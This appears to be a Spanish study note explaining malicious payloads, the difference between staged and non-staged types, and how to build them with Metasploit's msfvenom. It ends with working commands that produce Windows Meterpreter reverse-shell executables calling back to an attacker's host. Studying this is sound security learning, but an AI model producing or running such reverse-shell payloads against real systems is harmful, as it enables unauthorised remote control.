--------------
- Tags: #exploiting #hacking 
----------
# Definición

> Un **payload** es un código malicioso que se inserta en un sistema o software para realizar acciones dañinas o no autorizadas. Es el componente principal de un ataque y puede incluir funcionalidades como toma de control, robo de datos o instalación de puertas traseras.

# Tipos

Existen dos tipos de **payloads**, dependiendo de si está compuesto por una única etapa o si está compuesta por múltiples.
## Payload Staged

> Este tipo de **payload** se divide en dos o más etapas, donde la primera de ellas se encarga de establecer la conexión con la máquina comprometida. Una vez establecida la conexión, a partir de la segunda etapa, el atacante envía la carga útil real del ataque. Este tipo de **payloads** se utiliza para sortear medidas de seguridad adicionales, ya que la carga útil no se envía hasta que exista una conexión segura. 
> Este tipo de payloads pueden ser personalizados de manera dinámica a través de [[Metasploit]].
## Payload Non-Staged

> Esste tipo de **payload** se envía como una única entidad solo dispone de una sola etapa. La carga útil completa se envía a la máquina comprometida en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este tipo de **payloads** son más fácil de detectar por los sistemas de seguridad, ya que se envía el código malicioso de una sola vez.

# Creación de payloads

Para crear un **payload** utilizando la herramienta [[Metasploit]], podemos ejecutar el siguiente comando en bash:

```bash
msfvenom -p <tipo de payload> --platform <plataforma> -a <arquitectura> LHOST=<ip_local> LPORT=<puerto_local> -f <file> -o <output>
```

Para conseguir un **payload staged** o **non-staged para** windows, que devuelva una [[Reverse shell]], podemos ejecutar lo siguiente:

```bash
#payload staged
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=<ip_local> LPORT=<puerto_local> -f exe -o reverse.exe
#payload non-staged
msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=<ip_local> LPORT=<puerto_local> -f exe -o reverse.exe
```

La diferencia en la búsqueda consiste en el tipo de **payload**, cambiar una "/" por un "_".